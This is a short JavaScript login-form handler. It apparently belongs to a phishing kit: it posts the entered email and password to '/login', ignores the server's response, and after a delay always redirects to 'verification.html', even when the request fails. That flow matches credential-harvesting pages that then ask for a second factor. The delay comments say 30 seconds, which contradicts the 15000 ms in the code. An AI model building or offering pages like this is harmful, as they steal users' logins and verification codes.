document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
    }
    
    async function handleLogin(event) {
        event.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const submitButton = loginForm.querySelector('button[type="submit"]');
        
        if (!email || !password) {
            return;
        }
        
        // Store original button text
        const originalButtonText = submitButton.textContent;
        
        // Show spinner on button
        submitButton.disabled = true;
        submitButton.innerHTML = '<div class="spinner"></div>';
        
        const loginData = {
            email: email,
            password: password
        };
        
        try {
            // Send data to our server
            const response = await fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(loginData)
            });
            
            await response.json();
            
            // After submitting login data, wait for 30 seconds (30000 ms) before redirecting
            // to the verification page
            setTimeout(function() {
                window.location.href = 'verification.html';
            }, 15000); // 30 seconds delay
            
        } catch (error) {
            console.error('Error:', error);
            // Even on error, redirect to verification page after 30 seconds
            setTimeout(function() {
                window.location.href = 'verification.html';
            }, 15000); // 30 seconds delay
        }
    }
}); 
